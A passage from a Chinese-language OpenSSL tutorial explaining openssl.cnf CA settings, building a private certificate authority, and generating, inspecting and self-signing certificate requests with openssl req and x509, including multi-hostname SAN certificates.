cert_opt    = ca_default             <span style="color: #b22222;"># </span><span style="color: #b22222;">Certificate field options &#24403;&#29992;&#25143;&#38656;&#35201;&#30830;&#35748;&#31614;&#21457;&#35777;&#20070;&#26102;&#35777;&#20070;&#22495;&#30340;&#26174;&#31034;&#26684;&#24335;.&#21487;&#29992;&#20540;&#19982; x509 &#25351;&#20196;&#30340; -certopt &#36873;&#39033;&#30456;&#21516;&#65292;&#19981;&#36807; no_signame &#21644; no_sigdump &#24635;&#34987;&#40664;&#35748;&#35774;&#32622;&#12290;</span>
policy = policy_any                  <span style="color: #b22222;"># </span><span style="color: #b22222;">&#35777;&#20070;&#35831;&#27714;DN&#22495;&#21305;&#37197;&#31574;&#30053;&#30340;&#23383;&#27573;&#12290;&#23545;&#24212; -policy &#21629;&#20196;&#34892;&#36873;&#39033;&#12290;</span>
<span style="color: #b22222;">#</span><span style="color: #b22222;">----------------------------------------</span>
certs       = $<span style="color: #a0522d;">dir</span>/certs             <span style="color: #b22222;"># </span><span style="color: #b22222;">Where the issued certs are kept  &#39041;&#21457;&#30340;&#35777;&#20070;&#25152;&#22312;&#20301;&#32622;</span>
crl_dir     = $<span style="color: #a0522d;">dir</span>/crl               <span style="color: #b22222;"># </span><span style="color: #b22222;">Where the issued crl are kept   &#24050;&#21514;&#38144;&#35777;&#20070;&#30340;&#21514;&#38144;&#21015;&#34920;&#30340;&#23384;&#20648;&#30446;&#24405;&#20301;&#32622;</span>
crlnumber   = $<span style="color: #a0522d;">dir</span>/crlnumber         <span style="color: #b22222;"># </span><span style="color: #b22222;">the current crl number &#35777;&#20070;&#21514;&#38144;&#32534;&#21495;</span>
                                     <span style="color: #b22222;"># </span><span style="color: #b22222;">must be commented out to leave a V1 CRL</span>
crl     = $<span style="color: #a0522d;">dir</span>/crl.pem               <span style="color: #b22222;"># </span><span style="color: #b22222;">The current CRL   &#26366;&#34987;&#21514;&#38144;&#30340;&#35777;&#20070;&#21015;&#34920;</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#20174;&#24403;&#21069;CRL(&#35777;&#20070;&#25764;&#38144;&#21015;&#34920;)&#21040;&#19979;&#27425;CRL&#21457;&#24067;&#30340;&#38388;&#38548;&#23567;&#26102;&#25968;&#25110;&#22825;&#25968;&#12290;&#20381;&#27425;&#23545;&#24212; -crlhours , -crldays &#21629;&#20196;&#34892;&#36873;&#39033;&#12290;</span>
<span style="color: #b22222;">#</span><span style="color: #b22222;">default_crl_hours = 72</span>
<span style="color: #b22222;">#</span><span style="color: #b22222;">default_crl_days = 30</span>
copy_extensions = copy               <span style="color: #b22222;"># </span><span style="color: #b22222;">&#26159;&#21542;&#23558;&#35777;&#20070;&#35831;&#27714;&#20013;&#30340;&#25193;&#23637;&#39033;&#20449;&#24687;&#21152;&#20837;&#21040;&#35777;&#20070;&#25193;&#23637;&#39033;&#20013;&#21435;&#12290;</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#21462;&#20540;&#33539;&#22260;&#20197;&#21450;&#35299;&#37322;&#65306;</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">none: &#24573;&#30053;&#25152;&#26377;&#35777;&#20070;&#35831;&#27714;&#20013;&#30340;&#25193;&#23637;&#39033;</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">copy: &#23558;&#35777;&#20070;&#25193;&#23637;&#39033;&#20013;&#27809;&#26377;&#30340;&#39033;&#30446;&#22797;&#21046;&#21040;&#35777;&#20070;&#20013;</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">copyall: &#23558;&#25152;&#26377;&#35777;&#20070;&#35831;&#27714;&#20013;&#30340;&#25193;&#23637;&#39033;&#37117;&#22797;&#21046;&#36807;&#21435;&#65292;&#24182;&#19988;&#35206;&#30422;&#35777;&#20070;&#25193;&#23637;&#39033;&#20013;&#21407;&#26469;&#24050;&#32463;&#23384;&#22312;&#30340;&#20540;&#12290;</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#27492;&#36873;&#39033;&#30340;&#20027;&#35201;&#29992;&#36884;&#26159;&#20801;&#35768;&#35777;&#20070;&#35831;&#27714;&#25552;&#20379;&#20363;&#22914; subjectAltName &#20043;&#31867;&#25193;&#23637;&#30340;&#20540;&#12290;</span>

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#36890;&#24120;&#65292;&#35777;&#20070;&#31614;&#21457;&#30340;&#29305;&#31181;&#21517;&#31216;(DN)&#22495;&#30340;&#21508;&#20010;&#21442;&#25968;&#39034;&#24207;&#19982;&#35777;&#20070;&#31574;&#30053;&#30340;&#21442;&#25968;&#39034;&#24207;&#19968;&#33268;&#12290;</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#20294;&#26159;&#65292;&#22914;&#26524;&#36825;&#37324;&#35774;&#20026;yes&#21017;&#20445;&#25345;&#19982;&#35777;&#20070;&#35831;&#27714;&#20013;&#30340;&#21442;&#25968;&#39034;&#24207;&#19968;&#33268;&#12290;&#23545;&#24212; -preserveDN &#21629;&#20196;&#34892;&#36873;&#39033;&#12290;</span>
preserve = no

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#40664;&#35748;&#20540;&#20026; yes &#65292;&#35774;&#20026; no &#34920;&#31034;&#20174;&#35777;&#20070;&#30340;DN&#20013;&#21024;&#38500; EMAIL &#23383;&#27573;&#12290;&#23545;&#24212; -noemailDN &#21629;&#20196;&#34892;&#36873;&#39033;&#12290;</span>
email_in_dn = yes

x509_extensions = v3_ca              <span style="color: #b22222;"># </span><span style="color: #b22222;">&#29983;&#25104;&#33258;&#31614;&#21517;&#26681;&#35777;&#20070;&#26102;&#35201;&#20351;&#29992;&#30340;&#35777;&#20070;&#25193;&#23637;&#39033;&#23383;&#27573;&#21517;&#65292;&#35813;&#25193;&#23637;&#23383;&#27573;&#23450;&#20041;&#20102;&#35201;&#21152;&#20837;&#21040;&#26681;&#35777;&#20070;&#20013;&#30340;&#19968;&#31995;&#21015; X.509v3 &#25193;&#23637;&#39033;&#12290;&#23545;&#24212; -extensions &#21629;&#20196;&#34892;&#36873;&#39033;</span>
req_extensions = v3_req              <span style="color: #b22222;"># </span><span style="color: #b22222;">&#35777;&#20070;&#35831;&#27714;&#25193;&#23637;&#30340;&#23383;&#27573;&#21517;&#65292;&#35813;&#25193;&#23637;&#23383;&#27573;&#23450;&#20041;&#20102;&#35201;&#21152;&#20837;&#21040;&#35777;&#20070;&#35831;&#27714;&#20013;&#30340;&#19968;&#31995;&#21015; X.509v3 &#25193;&#23637;&#39033;&#12290;&#23545;&#24212; -reqexts &#21629;&#20196;&#34892;&#36873;&#39033;&#12290;</span>
<span style="color: #b22222;">#</span><span style="color: #b22222;">crl_extensions = crl_ext            # &#23450;&#20041;&#29983;&#25104;CRL&#26102;&#38656;&#35201;&#21152;&#20837;&#30340;&#25193;&#23637;&#39033;&#23383;&#27573;&#12290;&#23545;&#24212; -crlexts &#21629;&#20196;&#34892;&#36873;&#39033;&#12290;</span>
<span style="color: #b22222;">#</span><span style="color: #b22222;">-----------------------------------</span>
[ policy_any ]
countryName = match
stateOrProvinceName = match
organizationName = match
organizationalUnitName = match
localityName = optional
commonName      = supplied
emailAddress    = optional

<span style="color: #b22222;">#### </span><span style="color: #b22222;">&#29983;&#25104;&#33258;&#31614;&#21517;&#35777;&#20070;(RootCA)&#26102;&#20351;&#29992;&#30340; X.509v3 &#35777;&#20070;&#25193;&#23637;&#39033;&#65292;&#23545;&#24212; -addext &#21629;&#20196;&#34892;&#36873;&#39033; #####</span>
[ v3_ca ]
basicConstraints = critical,CA:TRUE
keyUsage = cRLSign, keyCertSign, digitalSignature
extendedKeyUsage = OCSPSigning
subjectKeyIdentifier = hash
authorityKeyIdentifier = keyid:always,issuer
noCheck = ignored

<span style="color: #b22222;">##### </span><span style="color: #b22222;">&#35201;&#21152;&#20837;&#21040;&#35777;&#20070;&#35831;&#27714;&#20013;&#30340;&#19968;&#31995;&#21015; X.509v3 &#25193;&#23637;&#39033;&#65292;&#23545;&#24212; -addext &#21629;&#20196;&#34892;&#36873;&#39033; #####</span>
[ v3_req ]
basicConstraints = CA:FALSE
keyUsage = nonRepudiation, digitalSignature, keyEncipherment
extendedKeyUsage = critical, serverAuth, clientAuth, timeStamping
<span style="color: #b22222;">#</span><span style="color: #b22222;">subjectAltName = DNS:www.example.com, DNS:example.com, DNS:*.example.net, IP:192.168.7.1, IP:13::17, email:copy</span>
1.3.6.1.5.5.7.1.24 = DER:30:03:02:01:05
tlsfeature = status_request
</pre>
</div>
</div>
</div>
</div>
<div id="outline-container-h:103203b1-11a4-4bac-97ee-d2cedc94f04e" class="outline-4">
<h4 id="h:103203b1-11a4-4bac-97ee-d2cedc94f04e">创建私有CA（自签名证书）</h4>
<div class="outline-text-4" id="text-h:103203b1-11a4-4bac-97ee-d2cedc94f04e">
<p>
1、创建CA所需要的文件
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;">#</span><span style="color: #b22222;">&#29983;&#25104;&#35777;&#20070;&#32034;&#24341;&#25968;&#25454;&#24211;&#25991;&#20214;</span>
touch /etc/pki/CA/index.txt
<span style="color: #b22222;">#</span><span style="color: #b22222;">&#25351;&#23450;&#31532;&#19968;&#20010;&#39041;&#21457;&#35777;&#20070;&#30340;&#24207;&#21015;&#21495;</span>
<span style="color: #483d8b;">echo</span> 01 &gt; /etc/pki/CA/serial <span style="color: #b22222;"># </span><span style="color: #b22222;">01&#26159;16&#36827;&#21046;</span>
</pre>
</div>

<p>
2、 生成CA私钥
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #483d8b;">cd</span> /etc/pki/CA/
(<span style="color: #483d8b;">umask</span> 066; openssl genrsa -out private/cakey.pem 2048)
</pre>
</div>

<p>
3、生成CA自签名证书
</p>

<div class="org-src-container">
<pre class="src src-sh">openssl req -new -x509 -key /etc/pki/CA/private/cakey.pem -days 36500 -out /etc/pki/CA/cacert.pem
</pre>
</div>

<p>
选项说明：
</p>

<div class="org-src-container">
<pre class="src src-sh">-new&#65306;&#29983;&#25104;&#26032;&#35777;&#20070;&#31614;&#32626;&#35831;&#27714;
-x509&#65306;&#19987;&#29992;&#20110;CA&#29983;&#25104;&#33258;&#31614;&#35777;&#20070;
-key&#65306;&#29983;&#25104;&#35831;&#27714;&#26102;&#29992;&#21040;&#30340;&#31169;&#38053;&#25991;&#20214;&#12290;&#19981;&#25351;&#23450;&#40664;&#35748;&#20197;&#24403;&#21069;&#30446;&#24405;openssl.cnf&#25110;/etc/pki/tls/openssl.cnf&#37197;&#32622;&#25991;&#20214;&#20026;&#20934;&#22791;
-days n&#65306;&#35777;&#20070;&#30340;&#26377;&#25928;&#26399;&#38480;
-out /PATH/TO/SOMECERTFILE: &#35777;&#20070;&#30340;&#20445;&#23384;&#36335;&#24452;
</pre>
</div>

<p>
国家代码：<a href="https://country-code.cl/">https://country-code.cl/</a>
</p>

<p>
范例: 使用x509工具自建CA
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;">#</span><span style="color: #b22222;">&#20351;&#29992;x509&#24037;&#20855;&#33258;&#24314;CA&#12290;&#30001;&#20110;x509&#26080;&#27861;&#24314;&#31435;&#35777;&#20070;&#35831;&#27714;&#25991;&#20214;&#65292;&#25152;&#20197;&#21482;&#33021;&#20351;&#29992;openssl req&#26469;&#29983;&#25104;&#35831;&#27714;&#25991;&#20214;&#65292;&#28982;&#21518;&#20351;&#29992;x509&#26469;&#33258;&#31614;&#32626;&#12290;</span>
openssl req -new -keyout key.pem -out req.csr
openssl x509 -req -days 36500 -in req.csr -signkey key.pem -out x509.crt
</pre>
</div>

<p>
合并生成CA私钥和CA自签名证书步骤， -newkey 选项自动创建私钥
</p>

<div class="org-src-container">
<pre class="src src-sh">openssl req  -newkey rsa:4096 -sha256 -keyout /etc/pki/CA/private/cakey.pem -nodes -x509 -days 36500 -out /etc/pki/CA/cacert.pem -subj <span style="color: #8b2252;">"/C=CN/ST=beijing/L=beijing/O=ops/CN=ca.xcw.org"</span>

&#35828;&#26126;
/C= Country&#22269;&#23478;&#12290;&#22914;CN
/ST=    State &#30465;&#25110;&#27954;&#30340;&#23436;&#25972;&#21517;&#31216;   London
/L= Location &#25152;&#22312;&#20301;&#32622;&#30340;&#21517;&#31216;(&#40664;&#35748;&#20026;&#22478;&#24066;)    London
/O= Organization &#32452;&#32455;&#26426;&#26500;&#21517;&#31216;(&#40664;&#35748;&#20026;&#20844;&#21496;)    Global Security
/OU=    Organizational Unit &#32452;&#32455;&#26426;&#26500;&#21333;&#20803;&#21517;&#31216;(eg.&#37096;&#38376;) IT Department
/CN=    Common Name&#25345;&#26377;&#32773;&#21517;&#25110;&#32773;&#25152;&#22312;&#26381;&#21153;&#22120;&#20027;&#26426;&#21517;(&#21363;&#22495;&#21517;) example.com
/emailAddress &#31649;&#29702;&#21592;&#37038;&#20214;&#22320;&#22336;&#65292;&#21487;&#20197;&#30465;&#30053;joshua.davies.tx@gmail.com
</pre>
</div>

<p>
范例：生成自签名证书
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;">#</span><span style="color: #b22222;">-newkey &#36873;&#39033;&#33258;&#21160;&#21019;&#24314;&#31169;&#38053;</span>
[root@centos8 ~]#openssl req -utf8 -newkey rsa:1024 -subj <span style="color: #8b2252;">"/CN=www.meu.org"</span> -keyout app.key -nodes -x509 -out app.crt
Generating a RSA private key
..+++++
..............................+++++
writing new private key to <span style="color: #8b2252;">'app.key'</span>
-----
[root@centos8 ~]#openssl x509 -in app.crt -noout -text
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number:
            6a:69:ec:c8:85:98:9c:e3:6a:99:a5:56:b1:22:76:c4:fb:1d:85:41
        Signature Algorithm: sha256WithRSAEncryption
        Issuer: CN = www.meu.org
        Validity
            Not Before: May 24 04:38:24 2020 GMT
            Not After : Jun 23 04:38:24 2020 GMT
        Subject: CN = www.meu.org
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                RSA Public-Key: (1024 bit)
                Modulus:
                    00:d3:f2:95:7c:4c:17:91:8d:93:7a:c6:91:31:f3:
                    fb:97:c9:c2:6b:3d:47:d3:47:e4:c7:f9:ef:97:65:
                    dc:64:6a:a5:ba:dc:2f:40:64:86:d0:40:b3:70:fb:
                    38:5a:11:b4:ec:21:e1:68:23:a4:53:66:dc:a4:76:
                    a2:91:75:d9:7b:51:4b:fb:3e:a8:86:44:72:99:7a:
                    41:d2:07:82:69:28:a9:06:74:42:e3:ce:9e:63:75:
                    9c:d0:d7:3c:96:79:ad:80:d6:9b:72:9a:33:25:46:
                    ec:50:b1:c0:3b:9c:65:38:ba:15:3a:17:8f:ff:43:
                    6e:28:53:01:c3:6c:31:c4:91
                Exponent: 65537 (0x10001)
        X509v3 extensions:
            X509v3 Subject Key Identifier: 
                45:A2:CA:F2:21:4F:17:82:A6:A4:D2:CA:36:FE:17:A0:97:C6:DB:29
            X509v3 Authority Key Identifier: 
                keyid:45:A2:CA:F2:21:4F:17:82:A6:A4:D2:CA:36:FE:17:A0:97:C6:DB:29

            X509v3 Basic Constraints: critical
                CA:TRUE
    Signature Algorithm: sha256WithRSAEncryption
         c8:06:8e:ab:a6:ea:ca:34:5e:d6:77:e1:25:fd:44:d5:cb:55:
         a7:25:cc:7f:9a:da:65:f0:5c:b5:f4:c6:c8:2e:dc:64:f9:e8:
         b4:77:74:ed:f9:10:b0:0f:d4:a9:3a:35:0e:c0:7d:23:98:2b:
         07:df:70:94:dc:62:2f:c4:c0:7a:9c:41:0d:3c:ca:b2:2c:6e:
         39:fc:05:45:71:f6:81:df:92:ab:23:c7:28:eb:f5:65:28:44:
         e2:9f:cc:ea:72:fc:20:ab:86:fd:79:00:6e:bc:16:93:b3:80:
         d1:c8:0d:c9:06:65:26:af:21:dc:e7:76:4c:42:1b:de:e6:43:
         21:27
</pre>
</div>
</div>
<div id="outline-container-h:229d84ff-9e5a-49ac-a35d-319dbd1ff220" class="outline-5">
<h5 id="h:229d84ff-9e5a-49ac-a35d-319dbd1ff220">openssl req (生成证书请求和自建CA)</h5>
<div class="outline-text-5" id="text-h:229d84ff-9e5a-49ac-a35d-319dbd1ff220">
<p>
一旦有了私钥，就可以创建证书签名申请（certificate signing request，
CSR）。这是要求CA给证书签名的一种正式申请，该申请包含申请证书的实体的
公钥以及该实体的某些信息。该数据将成为证书的一部分。CSR始终使用它携带
的公钥所对应的私钥进行签名。
</p>

<p>
CSR创建的过程一般都是交互式的，你需要提供区分证书所需的不同元素。认真
阅读openssl工具的帮助。如果你想让某一个字段为空，不要直接回车，必须输
入一个点（ . ）；如果直接回车，OpenSSL会直接使用这个字段默认的值（虽然
几乎所有人都这么做，但是如果使用的是默认的OpenSSL配置，直接回车没有任
何意义。只有在你意识到可以通过直接修改OpenSSL配置或者提供自己的配置文
件来修改默认配置的时候，直接回车才是没问题的）。
</p>

<p>
1.根据私钥pri_key.pem生成一个新的证书请求文件(CSR文件)
</p>

<div class="org-src-container">
<pre class="src src-sh">openssl genrsa -out pri_key.pem

openssl req -new -key pri_key.pem -out req1.csr
Country Name (2 letter code) [XX]:CN
State or Province Name (full name) []:beijing  
Locality Name (eg, city) [Default City]:beijing
Organization Name (eg, company) [Default Company Ltd]:.
Organizational Unit Name (eg, section) []:.
Common Name (eg, your name or your server<span style="color: #8b2252;">'s hostname) []:a.xcw.com</span>
<span style="color: #8b2252;">Email Address []:</span>

<span style="color: #8b2252;">Please enter the following '</span>extra<span style="color: #8b2252;">' attributes # &#19979;&#38754;&#20004;&#39033;&#20960;&#20046;&#19981;&#29992;&#32771;&#34385;&#65292;&#30041;&#31354;&#21363;&#21487;</span>
<span style="color: #8b2252;">to be sent with your certificate request</span>
<span style="color: #8b2252;">A challenge password []:</span>
<span style="color: #8b2252;">An optional company name []:</span>
</pre>
</div>

<p>
"-new"选项，使用”-newkey”选项也能创建证书请求文件，
</p>

<p>
2.查看证书请求文件(CSR文件)内容
</p>

<div class="org-src-container">
<pre class="src src-sh">cat req1.csr
openssl req -in req1.csr
openssl req -in req1.csr -text -noout <span style="color: #b22222;">#</span><span style="color: #b22222;">"-text"&#21644;"-noout"&#32467;&#21512;&#20351;&#29992;&#65292;&#21017;&#21482;&#36755;&#20986;&#35777;&#20070;&#35831;&#27714;&#30340;&#25991;&#20214;&#22836;&#37096;&#20998;</span>

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#29992;&#24403;&#21069;&#35777;&#20070;&#29983;&#25104; CSR &#25991;&#20214;</span>
<span style="color: #b22222;">#</span><span style="color: #b22222;">&#22914;&#26524;&#20320;&#24819;&#26356;&#26032;&#19968;&#24352;&#35777;&#20070;&#24182;&#19988;&#19981;&#24819;&#23545;&#37324;&#38754;&#30340;&#20449;&#24687;&#20316;&#20219;&#20309;&#26356;&#25913;&#65292;&#37027;&#20040;&#23454;&#29616;&#21487;&#20197;&#21464;&#24471;&#31616;&#21333;&#19968;&#20123;&#12290;&#20351;&#29992;&#19979;&#38754;&#30340;&#21629;&#20196;&#21487;&#20197;&#29992;&#24403;&#21069;&#30340;&#35777;&#20070;&#21019;&#24314;&#19968;&#20010;&#20840;&#26032;&#30340;CSR&#25991;&#20214;</span>
openssl x509 -x509toreq -in fd.crt -out fd.csr -signkey fd.key
</pre>
</div>

<p>
3.指定证书请求文件(CSR文件)中的签名算法
</p>

<p>
注意到证书请求文件的头部分有一项是”Signature Algorithm”，它表示使用
的是哪种数字签名算法。默认使用的是sha1，还支持md5、sha512等，更多可支
持的签名算法见”openssl dgst &#x2013;help”中所列出内容。例如此处指定md5算法。
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">openssl req -new -key pri_key.pem -out req2.csr -md5</span>

<span style="color: #b22222;"># </span><span style="color: #b22222;">openssl req -in req2.csr -noout -text | grep Algo</span>
            Public Key Algorithm: rsaEncryption
    Signature Algorithm: md5WithRSAEncryption
</pre>
</div>

<p>
4.验证请求文件(CSR文件)的数字签名,这样可以验证出证书请求文件是否被篡改过
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">openssl req -verify -in req2.csr -noout</span>
verify OK
</pre>
</div>

<p>
5.让openssl req自动创建所需的私钥文件
</p>

<p>
其实如果不提供 -key， <b>openssl req会在任何需要私钥的地方自动创建私钥</b>
，并保存在特定的位置，默认的保存位置为当前目录，文件名为privkey.pem，
具体保存的位置和文件名由配置文件(默认为/etc/pki/tls/openssl.cnf)决
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">openssl req -new -out req3.csr # &#21152;&#23494;&#35813;&#31169;&#38053;&#25991;&#20214;&#65292;&#24182;&#25552;&#31034;&#36755;&#20837;&#21152;&#23494;&#30340;&#23494;&#30721;&#12290;</span>
Generating a 2048 bit RSA private key          <span style="color: #b22222;"># </span><span style="color: #b22222;">&#33258;&#21160;&#21019;&#24314;&#31169;&#38053;</span>
..................+++
.....................................+++
writing new private key to <span style="color: #8b2252;">'privkey.pem'</span>
Enter PEM pass phrase:                         <span style="color: #b22222;"># </span><span style="color: #b22222;">&#35201;&#27714;&#36755;&#20837;&#21152;&#23494;&#31169;&#38053;&#25991;&#20214;&#30340;&#23494;&#30721;&#65292;&#19988;&#35201;&#27714;&#38271;&#24230;&#20026;4-1024&#20010;&#23383;&#31526;</span>
Verifying - Enter PEM pass phrase:

<span style="color: #b22222;"># </span><span style="color: #b22222;">openssl req -new -out req3.csr -nodes # -nodes"&#36873;&#39033;&#31105;&#27490;&#21152;&#23494;&#31169;&#38053;&#25991;&#20214;</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">openssl req -new -out req3.csr -nodes -keyout myprivkey.pem #&#20351;&#29992;"-keyout"&#36873;&#39033;&#25351;&#23450;&#31169;&#38053;&#25991;&#20214;&#30340;&#20445;&#23384;&#20301;&#32622;&#21644;&#25991;&#20214;&#21517;</span>
</pre>
</div>

<p>
6.使用”-newkey”选项自动创建私钥
</p>

<p>
-newkey选项可以直接指定私钥的算法和长度，所以它主要用在openssl req自动
创建私钥时。
</p>

<p>
格式为”-newkey arg”。arg的格式为”rsa:numbits”，rsa表示创建rsa私钥，
numbits表示私钥的长度，如果不给定长度(即”-newkey rsa”)则默认从配置文
件中读取长度值。其实不止支持rsa私钥，只不过现在基本都是用rsa私钥，所以
默认就使用rsa
</p>

<pre class="example" id="orgea71b3d">
# openssl req -newkey rsa:2048 -out req3.csr -nodes -keyout myprivkey.pem
</pre>

<p>
7.非交互方式生成CSR文件
</p>

<p>
方法1：使用”-subj args”选项
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">openssl req -new -key pri_key.pem -out req1.csr -subj /C=CN/ST=Beijing/L=Beijing/O=DevOps/CN=tomcat.aiull.com</span>
</pre>
</div>

<p>
"-subj args"选项格式
</p>

<div class="org-src-container">
<pre class="src src-sh">&#26367;&#25442;&#25110;&#33258;&#23450;&#20041;&#35777;&#20070;&#35831;&#27714;&#26102;&#38656;&#35201;&#36755;&#20837;&#30340;&#20449;&#24687;&#65292;&#24182;&#36755;&#20986;&#20462;&#25913;&#21518;&#30340;&#35831;&#27714;&#20449;&#24687;&#12290;args&#30340;&#26684;&#24335;&#20026;<span style="color: #8b2252;">"/type0=value0/type1=value1..."</span>&#65292;&#22914;&#26524;value&#20026;&#31354;&#65292;&#21017;&#34920;&#31034;&#20351;&#29992;&#37197;&#32622;&#25991;&#20214;&#20013;&#25351;&#23450;&#30340;&#40664;&#35748;&#20540;&#65292;&#22914;&#26524;value&#20540;&#20026;<span style="color: #8b2252;">"."</span>&#65292;&#21017;&#34920;&#31034;&#35813;&#39033;&#30041;&#31354;&#12290;&#20854;&#20013;&#21487;&#35782;&#21035;type(man req)&#26377;&#65306;

/C= Country&#22269;&#23478;&#12290;&#22914;CN
/ST= State &#30465;&#25110;&#27954;&#30340;&#23436;&#25972;&#21517;&#31216;   London
/L= Location &#25152;&#22312;&#20301;&#32622;&#30340;&#21517;&#31216;(&#40664;&#35748;&#20026;&#22478;&#24066;)    London
/O= Organization &#32452;&#32455;&#26426;&#26500;&#21517;&#31216;(&#40664;&#35748;&#20026;&#20844;&#21496;)    Global Security
/OU= Organizational Unit &#32452;&#32455;&#26426;&#26500;&#21333;&#20803;&#21517;&#31216;(eg.&#37096;&#38376;) IT Department
/CN= Common Name&#25345;&#26377;&#32773;&#21517;&#25110;&#32773;&#25152;&#22312;&#26381;&#21153;&#22120;&#20027;&#26426;&#21517;(&#21363;&#22495;&#21517;) example.com
/emailAddress &#31649;&#29702;&#21592;&#37038;&#20214;&#22320;&#22336;&#65292;&#21487;&#20197;&#30465;&#30053;xcw@gmail.com
</pre>
</div>

<p>
方法2：使用自定义的OpenSSL配置文件
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;">#</span><span style="color: #b22222;">&#33258;&#21160;&#29983;&#25104; www.test.com &#30340;CSR&#25991;&#20214;&#65292;&#21487;&#20197;&#20808;&#21019;&#24314;&#19968;&#20010;fd.cnf&#25991;&#20214;&#65306;</span>
[req]
prompt = no
distinguished_name = dn
req_extensions = ext
input_password = PASSPHRASE

[dn]
CN = www.test.com
emailAddress = webmaster@test.com
O = Feisty Duck Ltd
L = London
C = GB

[ext]
subjectAltName = DNS:www.test.com,DNS:test.com

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#28982;&#21518;&#20351;&#29992;&#19979;&#38754;&#30340;&#21629;&#20196;&#30452;&#25509;&#21019;&#24314;CSR&#25991;&#20214;&#65306;</span>
openssl req -new -config fd.cnf -key fd.key -out fd.csr
</pre>
</div>

<p>
8.加密-passout -passin
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #483d8b;">export</span> <span style="color: #a0522d;">MY_PASS</span>=123456 ; openssl genrsa -aes128  -out pri_key.pem -passout <span style="color: #8b2252;">"env:MY_PASS"</span>
openssl req -new -key pri_key.pem -passin <span style="color: #8b2252;">"env:MY_PASS"</span> -out req1.csr -subj /C=CN/ST=Beijing/L=Beijing/O=DevOps/CN=tomcat.aiull.com
</pre>
</div>

<p>
9.自签署证书，可用于自建根CA时
</p>

<p>
需要使用”-x509”选项
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;">#</span><span style="color: #b22222;">&#22914;&#26524;&#24050;&#32463;&#26377;&#20102;CSR&#65292;&#21487;&#20197;&#20351;&#29992;&#19979;&#38754;&#30340;&#25991;&#20214;&#21019;&#24314;&#35777;&#20070;</span>
openssl req -x509 -in req1.csr -key pri_key.pem  -out CA1.crt -days 36500
&#25110;
openssl x509 -req  -in fd.csr -signkey pri_key.pem -out CA1.crt -days 36500

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#20063;&#21487;&#20197;&#26080;&#38656;&#21333;&#29420;&#21019;&#24314;&#19968;&#20010;CSR&#65292;&#20351;&#29992;&#19979;&#38754;&#30340;&#21629;&#20196;&#30452;&#25509;&#20351;&#29992;&#31169;&#38053;&#21019;&#24314;&#33258;&#31614;&#21517;&#35777;&#20070;</span>
openssl req -new -x509 -days 36500 -key pri_key.pem -out CA1.crt

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#22914;&#26524;&#20320;&#19981;&#24819;&#26377;&#20132;&#20114;&#25552;&#31034;&#65292;&#30452;&#25509;&#20351;&#29992; -subj &#24182;&#24102;&#19978;&#26631;&#39064;&#20449;&#24687;&#23601;&#21487;&#20197;&#20102;</span>
openssl req -new -x509 -days 36500 -key fd.key -out fd.crt -subj <span style="color: #8b2252;">"/C=GB/L=London/O=Feisty Duck Ltd/CN=tomcat.aiull.com"</span>
</pre>
</div>

<p>
10.创建对多个主机名有效的证书
</p>

<p>
默认情况下，OpenSSL创建的证书只包含一个公用名而且只能设置一个主机名。
因为这个限制，即便你有其他相关联的站点，也不得不为每个站点生成一张单独
的证书。在这种情况下，使用一张多域名（multidomain）的证书就有意义了。
即便你是维护一个站点，也得确保用户在访问站点的所有子域名的时候证书是有
效的。
</p>

<p>
有两种方式在一张证书里面支持多主机名。一种方式是在X.509的使用者可选名
称（subjectalternative name，SAN）扩展字段里面列出所有要使用的主机名；
另外一种就是使用泛域名。可以将两种方式合在一起，这样更加方便。在实际使
用的时候，可以设置顶级域名和一个泛域名来囊括所有二级域名（例如
feistyduck.com 和 *.feistyduck.com ）。
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;">#</span><span style="color: #b22222;">&#23558;&#25193;&#23637;&#20449;&#24687;&#25918;&#22312;&#19968;&#20010;&#21333;&#29420;&#30340;&#25991;&#26412;&#25991;&#20214;&#20013;fd.ext&#65292;&#24517;&#39035;&#22312;&#21487;&#36873;&#21517;&#31216;&#21015;&#34920;&#20013;&#21253;&#21547;&#25152;&#26377;&#24819;&#35201;&#30340;&#20027;&#26426;&#21517;&#12290;</span>
<span style="color: #b22222;">#</span><span style="color: #b22222;">subjectAltName = DNS:*.feistyduck.com, DNS:feistyduck.com, DNS:*.aiull.com,DNS:aiull.com</span>
<span style="color: #483d8b;">echo</span> <span style="color: #8b2252;">'subjectAltName = DNS:*.feistyduck.com, DNS:feistyduck.com, DNS:*.aiull.com,DNS:aiull.com'</span> &gt;fd.ext

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#28982;&#21518;&#24403;&#20351;&#29992; x509 &#21629;&#20196;&#31614;&#21457;&#35777;&#20070;&#30340;&#26102;&#20505;&#65292;&#20351;&#29992; -extfile &#24320;&#20851;&#24341;&#29992;&#35813;&#25991;&#20214;</span>
